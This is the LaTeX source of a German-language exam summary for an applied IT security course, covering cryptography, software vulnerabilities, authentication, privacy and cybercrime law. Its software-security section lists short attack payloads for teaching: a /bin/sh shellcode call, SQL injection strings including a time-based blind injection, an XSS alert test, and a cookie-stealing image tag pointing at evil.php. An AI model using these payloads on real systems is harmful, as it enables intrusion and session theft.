\documentclass[11pt, paper=a4, twocolumn]{scrartcl}

\usepackage[ngerman]{babel}
\usepackage[utf8]{inputenc}

\usepackage[T1]{fontenc}

\usepackage{geometry}

\geometry{a4paper, top=20mm, left=15mm, right=15mm, bottom=20mm,
headsep=5mm, footskip=12mm}


\pagenumbering{gobble}

\title{\vspace{-1.25cm}Zusammenfassung AppITSec\vspace{-0.25cm}}
\date{\vspace{-5ex}}



\begin{document}
	\maketitle


\section{Einführung und Grundlagen}
\begin{itemize}
	\item Was ist Sicherheit?
		\begin{itemize}
			\item Schutzmaßnahmen basieren auf Annahmen
			\item Präventiv / eindämmen / kompensieren
			\item Mehrseitige Sicherheitsinteressen 
				verschiedener Parteien
			\item Aufbau von Vertrauensbeziehungen nötig
		\end{itemize}

	\item Schutzziele und Angreifer
		\begin{itemize}
			\item Interessen und Ziele
				\begin{itemize}
					\item CIA: Vertraulichkeit (confidentiality), 
						Integrität (integrity), Verfügbarkeit 
						(availabity)
					\item Verfügbarkeit (Wahrscheinlichkeit zu 
						Zeitpunkt) vs. Zuverlässigkeit 
						(Missionszeit)
					\item Integrität: semantisch (erfüllt Erwartung) 
						vs. Zustand (Modifizierung)
					\item Vertraulichkeit (Nachricht nur an Empfänger)
					\item Authentizität (kommt X von A?)
					\item Nicht-Abstreitbarkeit (Nachweis einer 
						Dienstleistung)
					\item Unbeobachtbarkeit (Wurde Ressource benutzt?)
					\item Anonymität (Wer wars?)
				\end{itemize}
			\item Gefahren
				\begin{itemize}
					\item Zufällige vs. böswillige Gefahren 
					\item Vertrauen macht Annahmen über Gefahren
					\item Transitive Ausbreitung von Fehlern
					\item Angreifermodell: Rolle, Verbreitung, 
						Verhalten
					\item Attack Trees: Wurzel (Angriffsziel) und 
						Ebenen (Teilaufgaben)
				\end{itemize}

			\item Schutzmechanismen
				\begin{itemize}
					\item Laptop Locks, Künstliche DNA
					\item Lokalisierungssoftware
					\item Schutz vor Dumpster Diving
					\item Anti-Tailgating
				\end{itemize}
		\end{itemize}

	\item Sicherheit im Cyberspace
		\begin{itemize}
			\item Naturgesetze des Cyberspace
				\begin{itemize}
					\item 1. Gesetz: Automatisierbarkeit (Nachbildung, 
						aber nur programmierte Regeln)

					\item 2. Gesetz: Räumliche Entgrenzung 
						(Entkopplung von geographie und Hardware)
					\item 3. Gesetz: Kopierbarkeit (Auch Identitäten)
					\item 4. Gesetz: Komplexität 
				\end{itemize}
			
			\item Auswirkungen auf Schutzziele und Angreifer
				\begin{itemize}
					\item Google Hacking
					\item Brute Force Angriffe
					\item Daten (physisch) vs. Informationen 
						(Interpretation)
					\item Informationsfluss: Sender, Empfänger, 
						Nachricht, Beobachter
					\item Inferenz von Wissen (Beispiel 
						Gleichungssystem)
					\item Denial of Service (automatisch vs. 
						menschlich)
					\item Malware, Spam, Spoofing
				\end{itemize}

		\end{itemize}


\end{itemize}

\section{Kryptographie}
	\begin{itemize}
		\item Symmetrische und asymmetrische Verfahren
			\begin{itemize}
				\item Sichert Vertraulichkeit und Integrität
				\item Angriffsbereich umfasst nur Schlüsseltext
				\item Schlüsselgenerierung, Ver- und Entschlüsselung
				\item Vernam-Chiffre (one-time-pad)
				\item Verteilung eines symm. Schlüssels über 
					Schlüsselverteilzentralen ($k_{AX},k_{BX}$)
				\item Asymmetrische Schlüsselverteilung
					\begin{itemize}
						\item A lässt pub. Key in 
							Schlüsselregister eintragen
						\item B stellt Anfrage an R
						\item B erhält pub. Key von A, signiert 
							von R
					\end{itemize}
				\item Symmetrische Authentifikation: Nachricht + k(m) als 
					MAC
				\item Asymmetrisch: Signierschlüssel + Testschlüssel
				\item Verteilung über Schlüsselregister
				\item Generierung von Zufallszahlen durch xor
				\item Symmetrischer Schlüsselaustausch bei $n$ 
					Teilnehmern: $n*(n-1)/2$
			\end{itemize}

		\item Sicherheit von Krypto
			\begin{itemize}
				\item Total, universal, selective, existential break
				\item ciphertext-only, known-plaintext, chosen-plaintext, 
					chosen-ciphertext
				\item Informationstheoretisch sicher vs. kryptographisch 
					stark
				\item Hybride Kryptosysteme (asymmetrischer 
					Schlüsseltausch)
				\item Informationstheoretisch sicher wenn hinter jedem 
					Schlüsseltext jeder Klartext gleichwahrscheinlich 
					ist
				\item Perfekte Sicherheit: keine Rückschlüsse von cipher 
					auf plain
			\end{itemize}

		\item Diffie-Hellman-Schlüsselaustausch
			\begin{itemize}
				\item Schlüsselaustausch: physikalisch vs. organisatorisch
				\item Grundlage: diskrete Exponentiation:\\ 
					$\alpha = g^a\;mod\;p$
				\item Primzahl $p$ und nat. Zahl $g$ öffentlich
				\item Teilnehmer wählen geheimes $a$ bzw. $b$
				\item Bilde $\alpha,\beta$ wie oben und tausche aus
				\item Berechnung von $\beta^a\;mod\;p$
			\end{itemize}
		
		\item RSA
			\begin{itemize}
				\item Mathematischer Hintergrund
					\begin{itemize}
						\item Modulare Exponentiation als 
							Grundlage 
						\item Eulersche Phi-Funktionen
						\item $a^{\phi(N)}\equiv 1\;mod\;N$
						\item $a^p \equiv a\;mod\;p$
					\end{itemize}

				\item Algorithmus
					\begin{enumerate}
						\item Wähle große Primzahlen $p$ und $q$
						\item Berechne $N=p*q$ und 
							$\phi(N)=(p-1)(q-1)$
						\item Wähle $3\leq c<\phi(N)$
						\item Berechne $d$ als multiplikatives 
							Inverses zu $c$
						\item public: $(c,N)$, private: $(d,N)$
					\end{enumerate}

			\end{itemize}

		\item Digitale Bezahlung
			\begin{itemize}
				\item Angriff von Davida
					\begin{itemize}
						\item Angreifer fängt verschlüsselte 
							Nachricht ab
						\item Angreifer wählt $y$, berechnet $y^c$ 
							und schickt $x^c*y^c$ an Bob
						\item Homomorphismus: $(x*y)^{c}$
						\item Angreifer erhält entschlüsseltes 
							$x*y$ und kann $y$ rausteilen
					\end{itemize}
				\item Blinde Signaturen
					\begin{itemize}
						\item Lasse $(m*r^{test})$ signieren
						\item Signatur mit $s$ liefert 
							$(m*r^t)^s=m^s*r$
						\item Division durch $r$ liefert 
							signiertes $m^s$
					\end{itemize}
				\item Erzeugung von digitalem Geld
					\begin{itemize}
						\item Bank hat Signierschlüssel und 
							Testschlüssel für 5 Euro
						\item Alice generiert Zufalszahlen $r$ und 
							$v$, $w=vv$
						\item Alice schickt $r^{t_5}*w$ an Bank
						\item Bank signiert dies und antwortet 
							mit $r*w^{s_5}$
						\item Alice teilt $r$ wieder raus und hat 
							signierten Geldschein
					\end{itemize}
			\end{itemize}
	\end{itemize}


\section{Software Security}
	\begin{itemize}
		\item Motivation
			\begin{itemize}
				\item Sicherheitslücken / vulnerabilities
				\item \texttt{-1 \% 2i == -1}
				\item Angriffsziel: eigenen Code ausführen
				\item Privilegeskalation
			\end{itemize}

		\item Integer Overflows
			\begin{itemize}
				\item Datentypen
					\begin{itemize}
						\item (un)signed \texttt{char}: 8 Bit, 
							0-255/-128-127
						\item \texttt{short}: min. 16 Bit
						\item \texttt{long}: min. 32 Bit
						\item \texttt{int}: mindestens ein 
							\texttt{short}, meist aber 
							\texttt{long}
					\end{itemize}
				\item Regeln des Typecast
					\begin{itemize}
						\item Downcast: Abschneiden der höchsten 
							Bytes 
						\item Upcast: Bei \texttt{signed} 
							Vorzeichen mitziehen
						\item Bei Vergleichen wird auf größeren 
							Typ erweitert
						\item \texttt{signed} $\leftrightarrow$ 
							\texttt{unsigned}: Vorzeichen 
							uminterpretieren
						\item Erst Größe, dann Vorzeichen
					\end{itemize}
				\item Modulus mit unsigned / signed
				\item Vergleich mit unsigned führt bei Überlauf zu 
					negativen Werten
				\item Längenvergleich mit Addition ist kritisch
			\end{itemize}

		\item Heap Overflows
			\begin{itemize}
				\item Alligned an (32 Bit?) Grenzen
				\item Wächst von unten nach oben
				\item Überschreiben von Funktionspointern
			\end{itemize}

		\item Shellcode
			\begin{itemize}
				\item \texttt{execve(''/bin/sh", argv, NULL)}
				\item String, Adresse davon + Null, Adresse davon
				\item \texttt{ebp}: rbp, rip (+4), par1 (+8)
			\end{itemize}

		\item Stack Overflows
			\begin{itemize}
				\item Text, Data (Var, BSS, Heap), Stack
				\item \texttt{strcpy, sprintf(buf,"\%s",str), scanf, 
					gets, strcat}
				\item Schutzmaßnahmen
					\begin{itemize}
						\item Kernel: MMU Access Control Lists 
							(NX), ASLR (Stack, Heap, Libs)
						\item Compiler: Split-Stack, Canaries
					\end{itemize}
				\item SUID root
				\item \texttt{x86}: Parameter umgekehrt pushen
				\item Häufig 16B Offset zwischen locals und RIP
			\end{itemize}

		\item Return-oriented Programming
			\begin{itemize}
				\item Gadgets for return
				\item Gadgets nacheinander auf Stack stapeln
				\item mit \texttt{pop esp} Gadget gotos nachbauen
				\item Address Translation Cache Preloading Attack
			\end{itemize}

		\item Formatstring-Angriffe
			\begin{itemize}
				\item \texttt{\%d, \%x, \%n}: (hexa)dez., Anzahl an Bytes
				\item Nimmt an, dass Argumente auf Stack liegen
				\item Analysieren mit \texttt{\%x}, schreiben mit 
					\texttt{\%n}
				\item Einbauen von Formatsymbolen durch Angreifer
				\item Internationalisierung durch Textdateien
			\end{itemize}

		\item Fehlerinjektion und Type Confusion
			\begin{itemize}
				\item Type Confusion: Zwei Variablen unterschiedlichen 
					Typs zeigen auf gleiche Adresse
				\item Ausgelöst durch Bitfehler
				\item Klassen mit Objektref. / Int
				\item Vorgehen
					\begin{itemize}
						\item Viele Objekte von Typ B erzeugen
						\item Alle A-Felder darin zeigen auf 
							gleiches A-Objekt an Adresse x
						\item Bitfehler lässt 1 Bit kippen sodass 
							eine Ref. nun auf y zeigt
						\item y vom Typ B?
						\item Schreiben: \texttt{p.i=addr-off}\\
							\texttt{q.a6.i=val}
					\end{itemize}
				\item Row Hammer für DRAM
			\end{itemize}

		\item Injection-Angriffe
			\begin{itemize}
				\item SQL-Injection
					\begin{itemize}
						\item Steuerzeichen: \texttt{; -- ' "}
						\item \texttt{INFORMATION\_SCHEMA}, 
							LIMIT-Klausel
						\item Problem der Rechtevergabe
						\item Beispielinjektion: 
							\texttt{admin';--}
						\item \texttt{UNION} zur Erweiterung von 
							Anfragen
						\item Bei fehlender Ausgabe:\\ 
							\texttt{SELECT IF(..., 
							benchmark(...),'false'),...-- }
						\item Schachtelung gegen regex
						\item SQL-Funktion \texttt{CONCAT}
						\item Lösungsansätze: Prepared statements, 
							real escape String
					\end{itemize}

				\item XSS
					\begin{itemize}
						\item Same Origin Policy: Protokoll, 
							Domain und Port
						\item Reflected: über URL
						\item Persistent: auf Server gespeichert
						\item DOM: URL erzeugt Skript mit 
							manipulierten DOM-Zugriffen
						\item Klassiker:\\ 
							\texttt{<skript>alert(1)</skript>}
						\item iframe mit Phishing Seite
						\item doc.write Bild mit\\
							src=evil.php?cookie=doc.cookie
						\item Gegenmaßnahmen: 
							\texttt{htmlentities()},  
							Whitelisting, 
							Content-Security-Policy usw.
					\end{itemize}

				\item Malicious file execution
					\begin{itemize}
						\item Meist Remote-/Webshells
						\item Ungeschickte Upload-Funktion
						\item Manipulieren von include-Anweisungen
						\item \texttt{system} Aufrufe mit ; 
							erweitern
					\end{itemize}
				\item Directory Traversal
			\end{itemize}

		\item Race Conditions
			\begin{itemize}
				\item TOCTOU Problem
				\item Nach Check eigentliche Datei durch Symlink ersetzen
				\item Kritischen Code mit \texttt{nice -n 19} ausführen
				\item Bei erzeugen von tmp Files diese umbiegen
				\item Verschachtelung von Signals
				\item Abhilfe: Korrekte synchro, reentrant Code, zufällige 
					Dateinamen
			\end{itemize}

	\end{itemize}

\section{Authentifikation, Authentisierung, Autorisierung}
	\begin{itemize}
		\item Begriffe: Wer authentisiert womit?
			\begin{itemize}
				\item Ziele: Zugriffskontrolle und Zurechenbarkeit
				\item Zugriffsmonitor prüft Berechtigungen
				\item Authentifikation überprüft Person = Identität
				\item Benutzerkennung ordnet Aktionen einem Benutzer zu
				\item Verifier authentifiziert Prover, der sich beim V 
					authentisiert
				\item Ablauf: Identifizierung, Authentifikation, 
					Autorisierung
				\item Faktoren: biometrisch, physisch, Wissen
				\item Zwischen Systemen: Krypto, Leitung usw.
				\item Qualität vs. Benutzbarkeit
			\end{itemize}

		\item Referenzmonitor und Zugriffskontrolle
			\begin{itemize}
				\item Referenzmonitor muss manipulationssicher, 
					unumgänglich und klein genug sein
				\item Beispiel: Betriebssystemmodi 
				\item Physischer Zugriff kann Monitor umgehen 
					(z.B. Cold Boot)
				\item Vertrauenswürdige Hardware notwendig
				\item Smartcards enthalten Mikroprozessor und 
					Kryptoschlüssel
				\item Trusted Platform Module (Schlüsselspeicher + 
					Randomgen.)
				\item Überprüft Stufe $n$ und gibt dann Schlüssel für 
					nächste Stufe frei
				\item Anwendung: Remote Attestation für Datei testen (DRM)
				\item Für vollständigen Schutz Wasserzeichen
			\end{itemize}

		\item Gegenseitige Authentifikation
			\begin{itemize}
				\item Vertrauenswürdiger Verifier?
				\item Bootkit: Angreifer manipuliert Bootloader sodass 
					dieser Passwort logged
				\item Bios-Rootkit kann Keyloggen
				\item Tamper (Bootkit speicher PW, dann reboot) and 
					Revert (richtiges BIOS reinstallieren)
				\item Copy, Sniff (Tamper) and Revert
				\item Lösung: Bei jedem Login neue monce
			\end{itemize}

		\item Trusting Trust (Trojanisierter Compiler)
	\end{itemize}

\section{Privacy}
	\begin{itemize}
		\item Identität und Privatsphäre
			\begin{itemize}
				\item Privacy
					\begin{itemize}
						\item Secrecy (limited access)
						\item Confidentiality (bzgl. Organisation)
						\item Privacy (bzgl. Individual)
						\item Personenbezogen vs. räumlich vs. 
							informationell
					\end{itemize}

				\item Identität
					\begin{itemize}
						\item Authentifizierungsmerkmale
						\item Natürliche vs. juristische Personen
						\item Teilidentitäten (Verkettung)
						\item Persistente Elemente wichtiger als 
							flüchtige
					\end{itemize}

				\item Bedrohungen
					\begin{itemize}
						\item Fehlentscheidung durch 
							Falschinformation
						\item Datenmissbrauch
						\item Zweitverwertung
						\item Verknüpfbarkeit
						\item Langfristige Aufbewahrung
						\item Öffentliche Zugänglichmachung
					\end{itemize}

				\item Identitätsdiebstahl
					\begin{itemize}
						\item New Account Fraud (künstliche ID)
						\item Account Takeover (bestehende ID)
					\end{itemize}
			\end{itemize}

		\item Anonymität
			\begin{itemize}
				\item DC-Netze
					\begin{itemize}
						\item Broadcastnetz
						\item Onetime-pad Schlüssel zwischen allen 
							Teilnehmern (pro Runde)
						\item Pro Runde: Nachricht mit allen 
							Schlüsseln die man hat xorn
						\item Wenn keine, dann leere Nachricht
						\item Summe aller Nachrichten ergibt 
							Original
						\item Perfekt anonym aber 
							Kollisionserkennung nötig
					\end{itemize}

				\item MIX-Verfahren
					\begin{itemize}
						\item Nachrichten sammeln und gemeinsam 
							ausgeben
						\item Alle Nachrichten am besten gleiche 
							Länge
						\item Verwendet asymmetrische Krypto
						\item Prinzip: 
							$A_1,c_1(A_2,c_2(M,r_2),r_1)$
					\end{itemize}

			\end{itemize}

		\item Informationsflusskontrolle und Seitenkanäle
			\begin{itemize}
				\item Inferenz(kontrolle)
				\item Funktionsumkehrung: \\
					Beobachter berechnet $\{z | f(z) = y\}$
				\item Abwehrmaßnahmen
					\begin{itemize}
						\item Dynamisches Monitoring ausgehender 
							Nachrichten
						\item Statische Verifikation beim Entwurf
					\end{itemize}
				\item Direkter, indirekter, transitiver, impliziter 
					Informationsfluss
				\item partial, implicit, difficult
				\item Über Arrays, Parallelität, Laufzeit
				\item Browser Fingerprinting
				\item Covert Channels
				\item Lösung: Aktionen ununterscheidbar machen
			\end{itemize}
	\end{itemize}

\section{Cybercrime}
	\begin{itemize}
		\item Malware
			\begin{itemize}
				\item unerwünschte / schädliche Funktionalität
				\item Schadroutine vs. Verbreitungsroutine
				\item Verbreitung: autonom (Wurm) vs. Interaktion (Virus, 
					Trojaner)
				\item Schaden: Spyware, Bot, Backdoor
				\item Klassiker: Melissa Spam
				\item Wurm: Verbreitung? Verteidigung?
				\item Malware (generisch, weite Verbreitung) vs. Milware 
					(spezifisch, 0-Day-Exploits)
			\end{itemize}

		\item Bots und Botnetze
			\begin{itemize}
				\item Bots ähnlich zu Würmern
				\item Machen Rechner fernsteuerbar
				\item Empfangen von Kommandos über IRC
				\item Patchbar über \texttt{http.update}
				\item Tracking durch Netzwerkanalyse, Infiltration
			\end{itemize}

		\item Underground Economy
			\begin{itemize}
				\item Gegen vs. Mit Technik begangene Straftaten
				\item Angebot >> Nachfrage
				\item Angebot
					\begin{itemize}
						\item Ernten durch Phishing, Skimming
						\item Dienstleistungen wie Hack, Host, 
							Spam
					\end{itemize}
				\item Nachfrage
					\begin{itemize}
						\item Daten zu Geld machen
						\item Money Mules zur Geldwäsche
						\item Reshipper, CEO-Fraud
					\end{itemize}
				\item Spam für Werbung, Phishing, Malware
				\item Template-based Spamming über Bots
				\item Fast Flux: Bots als Web-Proxies
				\item Click Fraud
				\item DDoS via Botnetze
				\item Pay per Install Dienste
				\item Fake A/V, Ransomware
				\item Stock Spam (Pump and Dump)
			\end{itemize}

		\item Recht und Ethik
			\begin{itemize}
				\item Tatwerkzeug vs. Angriffsziel
				\item Vertraulichkeit (§202)
					\begin{itemize}
						\item Ausspähen von Daten (§202a)
						\item Abfangen von Daten (§202b)
						\item Vorbereiten des Ausspähens / 
							Abfangens (§202c)
					\end{itemize}
				\item Integrität (§303)
					\begin{itemize}
						\item Datenveränderung (§303a)
						\item Computersabotage (§303b)
					\end{itemize}
				\item Verfügbarkeit (§303)\\
					Computersabotage (§303b)
				\item Computerbetrug §263a
				\item Ethische Richtlinien
				\item Wer profitiert? Nutzen vs. mögliche Schäden, 
					verringern von Schadensrisiko, wenig 
					Missbrauchpotential
			\end{itemize}
	\end{itemize}

\end{document}
